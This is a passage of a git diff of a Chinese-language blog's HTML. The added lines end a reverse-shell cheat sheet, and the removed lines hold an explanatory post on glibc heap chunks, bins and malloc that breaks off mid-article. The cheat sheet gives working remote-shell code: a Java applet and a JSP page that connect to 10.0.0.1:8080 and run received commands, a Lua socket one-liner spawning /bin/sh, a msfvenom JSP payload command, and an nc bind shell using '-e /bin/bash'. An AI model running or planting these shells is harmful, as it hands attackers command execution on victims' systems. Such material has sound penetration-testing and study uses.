class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div></pre></td><td class="code"><pre><div class="line">import java.io.*;</div><div class="line">import java.net.Socket;</div><div class="line">import java.util.*;</div><div class="line">import java.util.regex.*;</div><div class="line">import java.applet.Applet;</div><div class="line"></div><div class="line">public class poc extends Applet&#123;</div><div class="line">    /**</div><div class="line">     * Author: daniel baier alias duddits</div><div class="line">     * Licens: GPL</div><div class="line">     * Requirements: JRE 1.5 for running and the JDK 1.5 for compiling or higher</div><div class="line">     * Version: 0.1 alpha release</div><div class="line">     */</div><div class="line"></div><div class="line">    public String cd(String start, File currentDir) &#123;</div><div class="line">        File fullPath = new File(currentDir.getAbsolutePath());</div><div class="line">        String sparent = fullPath.getAbsoluteFile().toString();</div><div class="line">        return sparent + &quot;/&quot; + start;</div><div class="line"></div><div class="line">        &#125;</div><div class="line"></div><div class="line">    @SuppressWarnings(&quot;unchecked&quot;)</div><div class="line">    public void init() &#123;</div><div class="line">        poc rs = new poc();</div><div class="line">        PrintWriter out;</div><div class="line">        try &#123;</div><div class="line">            Socket clientSocket = new Socket(&quot;10.0.0.1&quot;,8080);</div><div class="line">            out = new PrintWriter(clientSocket.getOutputStream(), true);</div><div class="line">            out.println(&quot;\tJRS 0.1 alpha release\n\tdeveloped by duddits alias daniel baier&quot;);</div><div class="line">            boolean run = true;</div><div class="line">            String s;</div><div class="line">            BufferedReader br = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));</div><div class="line">            String startort = &quot;/&quot;;</div><div class="line">            while (run) &#123;</div><div class="line">                String z1;</div><div class="line">                File f = new File(startort);</div><div class="line">                out.println(f.getAbsolutePath() + &quot;&gt; &quot;);</div><div class="line">                s = br.readLine();</div><div class="line">                z1 = s;</div><div class="line">                Pattern pcd = Pattern.compile(&quot;^cd\\s&quot;);</div><div class="line">                Matcher mcd = pcd.matcher(z1);</div><div class="line">                String[] teile1 = pcd.split(z1);</div><div class="line">                if (s.equals(&quot;exit&quot;)) &#123;</div><div class="line">                    run = false;</div><div class="line">                &#125;else if (s.equals(null) || s.equals(&quot;cmd&quot;) || s.equals(&quot;&quot;)) &#123;</div><div class="line"></div><div class="line">                &#125; else if(mcd.find())&#123;</div><div class="line">                    try &#123;</div><div class="line">                        String cds = rs.cd(teile1[1], new File(startort));</div><div class="line">                        startort = cds;</div><div class="line">                        &#125; catch (Exception verz) &#123;</div><div class="line">                        out.println(&quot;Path &quot; + teile1[1]</div><div class="line">                        + &quot; not found.&quot;);</div><div class="line">                        &#125;</div><div class="line"></div><div class="line">                &#125;else &#123;</div><div class="line"></div><div class="line">                    String z2;</div><div class="line"></div><div class="line"></div><div class="line">                    z2 = s;</div><div class="line">                    Pattern pstring = Pattern.compile(&quot;\\s&quot;);</div><div class="line">                    String[] plist = pstring.split(z2);</div><div class="line"></div><div class="line">                    try &#123;</div><div class="line"></div><div class="line">                        LinkedList slist = new LinkedList();</div><div class="line">                        for (int i = 0; i &lt; plist.length; i++) &#123;</div><div class="line">                            slist.add(plist[i]);</div><div class="line">                        &#125;</div><div class="line"></div><div class="line">                        ProcessBuilder builder = new ProcessBuilder(slist);</div><div class="line">                        builder.directory(new File(startort));</div><div class="line">                        Process p = builder.start();</div><div class="line">                        Scanner se = new Scanner(p.getInputStream());</div><div class="line">                        if (!se.hasNext()) &#123;</div><div class="line">                            Scanner sa = new Scanner(p.getErrorStream());</div><div class="line">                            while (sa.hasNext()) &#123;</div><div class="line">                                out.println(sa.nextLine());</div><div class="line">                            &#125;</div><div class="line">                        &#125;</div><div class="line">                        while (se.hasNext()) &#123;</div><div class="line">                            out.println(se.nextLine());</div><div class="line">                        &#125;</div><div class="line"></div><div class="line"></div><div class="line">                    &#125; catch (Exception err) &#123;</div><div class="line">                        out.println(f.getAbsolutePath() + &quot;&gt; Command &quot;</div><div class="line">                                + s + &quot; failed!&quot;);</div><div class="line">                        out.println(f.getAbsolutePath() +&quot;&gt; Please try cmd /c &quot;+ s+&quot; or bash -c &quot; +s+&quot; if this command is an shell buildin.&quot;);</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            if(!clientSocket.isConnected())&#123;</div><div class="line">                run = false;</div><div class="line">                out.flush();</div><div class="line">                out.close();</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125; catch (Exception io) &#123;</div><div class="line">            //System.err.println(&quot;Connection refused by peer&quot;);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static void main(String[] args)&#123;</div><div class="line">        poc p = new poc();</div><div class="line">        p.init();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<blockquote>
+<p>运行此程序之前，应该更改环境变量的设置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; export DISPLAY=:0.0</div><div class="line">&gt; 或者</div><div class="line">&gt; setenv DISPLAY :0.0</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="8、Lua"><a href="#8、Lua" class="headerlink" title="8、Lua"></a>8、Lua</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','8080');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></div></pre></td></tr></table></figure>
+<p>不建议安装最新的lua，因为会出现以下问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">lua: (command line):1: module &apos;socket&apos; not found:</div><div class="line">	no field package.preload[&apos;socket&apos;]</div><div class="line">	no file &apos;/usr/local/share/lua/5.2/socket.lua&apos;</div></pre></td></tr></table></figure>
+<p>这个时候，你应该查看一下服务器上的/usr/local/share/lua下的目录到底是5.1还是5.2，根据其版本，安装正确的lua</p>
+<h3 id="9、Jsp"><a href="#9、Jsp" class="headerlink" title="9、Jsp"></a>9、Jsp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">使用</div><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=8080 R &gt; re.jsp</div></pre></td></tr></table></figure>
+<p>reverse_shell.jsp</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.lang.*"</span>%&gt;</div><div class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.util.*"</span>%&gt;</div><div class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.io.*"</span>%&gt;</div><div class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.net.*"</span>%&gt;</div><div class="line"></div><div class="line">&lt;%</div><div class="line">  <span class="class"><span class="keyword">class</span> <span class="title">StreamConnector</span> <span class="keyword">extends</span> <span class="title">Thread</span></span></div><div class="line">  &#123;</div><div class="line">    InputStream zd;</div><div class="line">    OutputStream fm;</div><div class="line"></div><div class="line">    StreamConnector( InputStream zd, OutputStream fm )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">this</span>.zd = zd;</div><div class="line">      <span class="keyword">this</span>.fm = fm;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">      BufferedReader fr  = <span class="keyword">null</span>;</div><div class="line">      BufferedWriter ctw = <span class="keyword">null</span>;</div><div class="line">      <span class="keyword">try</span></div><div class="line">      &#123;</div><div class="line">        fr  = <span class="keyword">new</span> BufferedReader( <span class="keyword">new</span> InputStreamReader( <span class="keyword">this</span>.zd ) );</div><div class="line">        ctw = <span class="keyword">new</span> BufferedWriter( <span class="keyword">new</span> OutputStreamWriter( <span class="keyword">this</span>.fm ) );</div><div class="line">        <span class="keyword">char</span> buffer[] = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">8192</span>];</div><div class="line">        <span class="keyword">int</span> length;</div><div class="line">        <span class="keyword">while</span>( ( length = fr.read( buffer, <span class="number">0</span>, buffer.length ) ) &gt; <span class="number">0</span> )</div><div class="line">        &#123;</div><div class="line">          ctw.write( buffer, <span class="number">0</span>, length );</div><div class="line">          ctw.flush();</div><div class="line">        &#125;</div><div class="line">      &#125; <span class="keyword">catch</span>( Exception e )&#123;&#125;</div><div class="line">      <span class="keyword">try</span></div><div class="line">      &#123;</div><div class="line">        <span class="keyword">if</span>( fr != <span class="keyword">null</span> )</div><div class="line">          fr.close();</div><div class="line">        <span class="keyword">if</span>( ctw != <span class="keyword">null</span> )</div><div class="line">          ctw.close();</div><div class="line">      &#125; <span class="keyword">catch</span>( Exception e )&#123;&#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">try</span></div><div class="line">  &#123;</div><div class="line">    String ShellPath;</div><div class="line"><span class="keyword">if</span> (System.getProperty(<span class="string">"os.name"</span>).toLowerCase().indexOf(<span class="string">"windows"</span>) == -<span class="number">1</span>) &#123;</div><div class="line">  ShellPath = <span class="keyword">new</span> String(<span class="string">"/bin/sh"</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">  ShellPath = <span class="keyword">new</span> String(<span class="string">"cmd.exe"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">    Socket socket = <span class="keyword">new</span> Socket( <span class="string">"10.0.0.1"</span>, <span class="number">8080</span> );</div><div class="line">    Process process = Runtime.getRuntime().exec( ShellPath );</div><div class="line">    ( <span class="keyword">new</span> StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();</div><div class="line">    ( <span class="keyword">new</span> StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();</div><div class="line">  &#125; <span class="keyword">catch</span>( Exception e ) &#123;&#125;</div><div class="line">%&gt;</div></pre></td></tr></table></figure>
+<h3 id="10、正向shell（nc为例）"><a href="#10、正向shell（nc为例）" class="headerlink" title="10、正向shell（nc为例）"></a>10、正向shell（nc为例）</h3><p>服务器端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvvp 7777 -e /bin/bash</div></pre></td></tr></table></figure>
+<p>攻击端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc 10.0.0.2 7777</div></pre></td></tr></table></figure>
+<p>最后要说的是xterm，这是一个session，可以维持；而由于服务器上和本地都得装相应的程序，所以起来较为麻烦！</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/09/tmux使用教程/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2519,220 +2727,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/17/浅析堆的申请释放及相应保护机制/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/11/17/浅析堆的申请释放及相应保护机制/" itemprop="url">浅析堆的申请释放及相应保护机制</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-17T20:04:44+08:00">
-                2017-11-17
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0×00-前面的话"><a href="#0×00-前面的话" class="headerlink" title="0×00 前面的话"></a>0×00 前面的话</h2><p>在了解这部分的时候，首先你最好阅读一下这两篇博客：</p>
-<p><a href="/2017/09/10/Linux堆内存管理深入分析（上）/">Linux堆内存管理深入分析（上）</a></p>
-<p><a href="/2017/09/15/Linux堆内存管理深入分析（下）/">Linux堆内存管理深入分析（下）</a></p>
-<p><strong>在内存中，堆是一个很有趣的地方，因为它可以由用户去直接的进行分配与销毁，所以也产生了一些很有趣、奇思妙想的漏洞，像unlink漏洞、House系列漏洞等等。但是在学习的过程中，我们很容易难以理解那些介绍的比较模糊的概念，比如 unsortedbin 在某些条件下会放回 smallbin 或 largebin 中，那到底是什么时候？也会对一些大佬构造的 payload 犯迷糊，为什么这里多了一个chunk，为什么这个字节要填充…，大佬们往往不对这些细节做过多的解释，但是这可难为了我们初学堆利用的新兵，所以，我想写几篇文章，将堆的运作机制，例如一些基本的概念，malloc机制、free机制、保护机制，和利用方法结合起来说一下，让大家能够对堆这一块有个较为清楚的认识，少走一些弯路。首先呢，我想在这篇文章中较为细致的介绍一下堆中的一些情况，剩下的有机会的话我会一并写成一个系列。</strong></p>
-<p>这篇文章主要分为四个部分：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">0x01 chunk 简介</div><div class="line">0x02 bin 简介</div><div class="line">0x03 malloc 机制</div><div class="line">0x04 free 机制</div></pre></td></tr></table></figure>
-<p>这些内容相对比较重要，如果看完还觉得不够的，推荐大家去读一下华庭老师的《glibc内存管理ptmalloc源代码分析》。</p>
-<h2 id="0×01-chunk-简介"><a href="#0×01-chunk-简介" class="headerlink" title="0×01 chunk 简介"></a>0×01 chunk 简介</h2><p>首先先说一下堆是如何分配的，在内存中，堆（低地址到高地址，属性RW）有两种分配方式（与malloc申请chunk做区分）:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mmap: 当申请的size大于128kb时，由mmap分配。有时候是0x22000</div><div class="line">brk: 当申请的size小于128kb时，由brk分配，第一次分配132KB（main arena）,第二次在brk下分配，不够则执行系统调用，向系统申请</div></pre></td></tr></table></figure>
-<p>在内存中进行堆的管理时，系统基本是以 chunk 作为基本单位，chunk的结构在源码中有定义</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">struct malloc_chunk &#123;</div><div class="line">    INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */</div><div class="line">    INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */</div><div class="line">    struct malloc_chunk* fd; /* double links -- used only if free. */</div><div class="line">    struct malloc_chunk* bk;</div><div class="line">    /* Only used for large blocks: pointer to next larger size. */</div><div class="line">    struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */</div><div class="line">    struct malloc_chunk* bk_nextsize;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
-<p>INTERNAL_SIZE_T 即 size_t</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#ifndef INTERNAL_SIZE_T</div><div class="line">#define INTERNAL_SIZE_T size_t</div><div class="line">#endif</div></pre></td></tr></table></figure>
-<p>我们可以打印一下本机的 sizeof(size_t)，这个长度可以说是一个基准单位</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">int main() &#123;</div><div class="line">    printf(&quot;sizeof(size_t) is %d\n&quot;,sizeof(size_t));</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>这个结构不再多谈，相关的介绍网上很多，主要提一下结构体中最后两个指针 fd_nextsize 和 bk_nextsize，这两个指针只在 largebin 中使用，其他情况下为 NULL。我们可以根据 chunk 的状态将其分为三种（allocated chunk、free chunk、top chunk）:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">allocated chunk:</div><div class="line">        chunk header:</div><div class="line">            prev_size（当上一块是free状态时，存储该chunk的size，否则被上一块chunk使用）</div><div class="line">            size（该chunk大小（包括chunk header），某位3 bits为标志位）</div><div class="line">                0bit表示上一chunk是否free</div><div class="line">                1bit表示该chunk是否由mmap分配</div><div class="line">                2bit表示该chunk是否属于main arena</div><div class="line">        data:</div><div class="line"> </div><div class="line"> </div><div class="line">free chunk:</div><div class="line">        chunk header:</div><div class="line">            prev_size:</div><div class="line">            size:</div><div class="line">        fd:指向 bin 中的next chunk</div><div class="line">        bk:指向 bin 中的last chunk（bin中先进的为last，后进的为next）</div><div class="line">        fd_nextsize:</div><div class="line">        bk_nextsize:</div><div class="line"></div><div class="line"></div><div class="line">top chunk:brk中未分配的顶端chunk</div><div class="line">        chunk header:</div><div class="line">            prev_size:</div><div class="line">            size:</div></pre></td></tr></table></figure>
-<p>其中在 free chunk中有一种特殊的chunk(last remainder chunk):</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">last remainder chunk:从free chunk中malloc时，如果该chunk足够大，那么将其分为两部分，未分配的放到last remainder中并交由 unsorted bin 管理。</div></pre></td></tr></table></figure>
-<p>重点强调一下：这里的上一块表示在内存的堆中连续的chunk的上一块，区别bin中的前后关系。另外 chunk 的前后关系只有在bin中是使用fd、bk指针标识的，在内存中连续的chunk则通过 prev_size 和 size 来寻找前后 chunk，当然，这也就造成了漏洞。</p>
-<font color="#f00">由于chunk会在几种状态之间切换，当其为free chunk时，最少需要4<em>sizeof(size_t)的空间，所以有最小分配大小。<br><br>并且由于prev_size的复用，所以实际申请的大小为 max(2sizeof(size_t)(chunk_header)-sizeof(size_t)(prev_size)+申请大小, 最小分配大小)，而且 chunk的size是按照 2sizeof(size_t)对齐的，也就是说当你申请一个不是 2</em>sizeof(size_t)整倍数的空间时， malloc 返回的 size 有会对齐，大于实际申请的空间。</font>
-
-<p>另外提一下，当 malloc 一个chunk后，实际返回用户的地址为chunk除去chunk header后的地址，而在bin中存储的是chunk的地址，也就是说</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">p = malloc(0x40); // 假设chunk的地址为 0xdeadbeef,则返回给用户的地址是 0xdeadbeef+sizeof(chunk header)</div><div class="line">free(p)  //将p释放掉后，保存在bin中的地址为 0xdeadbeef</div></pre></td></tr></table></figure>
-<h2 id="0×02-bin简介"><a href="#0×02-bin简介" class="headerlink" title="0×02 bin简介"></a>0×02 bin简介</h2><p>bin在内存中用来管理free chunk，bin为带有头结点（链表头部不是chunk）的链表数组，根据特点，将bin分为四种，分别为(fastbin、unsortedbin、smallbin、largebin):</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">fastbin:</div><div class="line">    根据chunk大小维护多个单向链表</div><div class="line">    sizeof(chunk) &lt; 64(bytes)</div><div class="line">    下一chunk（内存中）的free标志位不取消，显示其仍在使用</div><div class="line">    后进先出（类似栈），后free的先被malloc</div><div class="line">    拥有维护固定大小chunk的10个链表</div><div class="line">unsortedbin:</div><div class="line">    双向循环链表</div><div class="line">    不排序</div><div class="line">    暂时存储free后的chunk，一段时间后会将chunk放入对应的bin中（详见0x02）</div><div class="line">    只有一个链表</div><div class="line">smallbin:</div><div class="line">    双向循环链表</div><div class="line">    sizeof(chunk) &lt; 512 (bytes)</div><div class="line">    先进先出（类似队列）</div><div class="line">    16,24...64,72...508 bytes(62个链表)</div><div class="line">largebin:</div><div class="line">    双向循环链表</div><div class="line">    sizeof(chunk) &gt;= 512 (bytes)</div><div class="line">    free chunk中多两个指针分别指向前后的large chunk</div><div class="line">    63个链表:0-31(512+64*i)</div><div class="line">            32-48(2496+512*i)</div><div class="line">            ...</div><div class="line">    链表中chunk大小不固定，先大后小</div></pre></td></tr></table></figure>
-<p>这其中 fastbin 像是cache，用来实现快速的chunk分配，其中的chunk size大小与smallbin中的有重复（只是说大小，chunk并不重复）</p>
-<p>unsortedbin 功能也是作为cache，尽量减少搜索合适chunk的时间。</p>
-<p>这四个bin中，除了fastbin，其他三个都是维护双向循环链表，并且由一个长度为128 size_t的数组bins维护，bins结构如下：</p>
-<table>
-<thead>
-<tr>
-<th>NULL</th>
-<th>unsortbin</th>
-<th>smallbin</th>
-<th>largebin</th>
-<th>NULL</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>0</td>
-<td>1</td>
-<td>2-63</td>
-<td>64-126</td>
-<td>127</td>
-</tr>
-</tbody>
-</table>
-<h2 id="0×03-malloc机制"><a href="#0×03-malloc机制" class="headerlink" title="0×03 malloc机制"></a>0×03 malloc机制</h2><p>malloc功能主要由 _int_malloc() 函数实现，原型如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">static Void_t* _int_malloc(mstate av,size_t bytes)</div></pre></td></tr></table></figure>
-<p>当接收到申请的内存大小后，我们看一下malloc的申请过程。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">长度位于 fastbin 时:</div><div class="line">    1.根据大小获得fastbin的index</div><div class="line">    2.根据index获取fastbin中链表的头指针</div><div class="line">        如果头指针为 NULL，转去smallbin</div><div class="line">    3.将头指针的下一个chunk地址作为链表头指针</div><div class="line">    4.分配的chunk保持inuse状态，避免被合并</div><div class="line">    5.返回除去chunk_header的地址</div><div class="line">长度位于 smallbin 时:</div><div class="line">    1.根据大小获得smallbin的index</div><div class="line">    2.根据index获取smallbin中双向循环链表的头指针</div><div class="line">    3.将链表最后一个chunk赋值给victim</div><div class="line">    4.if(victim == 表头)</div><div class="line">        链表为空，不从smallbin中分配</div><div class="line">      else if(victim == 0)</div><div class="line">        链表未初始化，将fastbin中的chunk合并</div><div class="line">      else</div><div class="line">        取出victim,设置inuse</div><div class="line">    5.检查victim是否为main_arena,设置标志位</div><div class="line">    6.返回除去chunk_header的地址</div><div class="line">长度位于 largebin 时:</div><div class="line">    1.根据大小获得largebin的index</div><div class="line">    2.将fastbin中chunk合并，加入到unsortbin中</div></pre></td></tr></table></figure>
-<p>留意一点：系统实际分配的内存地址与返回的地址是不同的，返回的地址直接指向了除去 chunk header 的地址。</p>
-<p>当然，我们注意到上面的分配过程并没有完成，当 smallbin 中没有 chunk 或者 smallbin 未初始化时，并没有返回分配结果，这种情况下的chunk分配将在后面与largebin的分配一起处理</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">unsortedbin:</div><div class="line">    1.反向遍历unsortedbin,检查 2*size_t&lt;chunk_size&lt;内存总分配量</div><div class="line">    2.unsortedbin的特殊分配:</div><div class="line">            如果前一步smallbin分配未完成</div><div class="line">            并且 unsortedbin中只有一个chunk</div><div class="line">            并且该chunk为 last remainder chunk</div><div class="line">            并且该chunk大小 &gt;（所需大小+最小分配大小）</div><div class="line">       则切分一块分配</div><div class="line">    3.如果请求大小正好等于当前遍历chunk的大小，则直接分配</div><div class="line">    4.继续遍历，将合适大小的chunk加入到smallbin中，向前插入作为链表的第一个chunk。(smallbin中每个链表中chunk大小相同)</div><div class="line">    5.将合适大小的chunk加入到largebin中，插入到合适的位置（largebin中每个链表chunk由大到小排列）</div><div class="line">largebin:</div><div class="line">    1.反向遍历largebin，由下到上查找，找到合适大小后切分</div><div class="line">        切分后大小&lt;最小分配大小，返回整个chunk，会略大于申请大小</div><div class="line">        切分后大小&gt;最小分配大小，加入 unsortedbin。</div><div class="line">    2.未找到，index+1，继续寻找</div></pre></td></tr></table></figure>
-<p>如果这之后还未找到合适的chunk，那么就会使用top chunk进行分配,还是没有的话，如果在多线程环境中，fastbin可能会有新的chunk，再次执行合并，并向unsortedbin中重复上面，还是没有的话，就只能向系统申请了。</p>
-<p>以上就是malloc分配的全经过。</p>
-<p>几个malloc检查：</p>
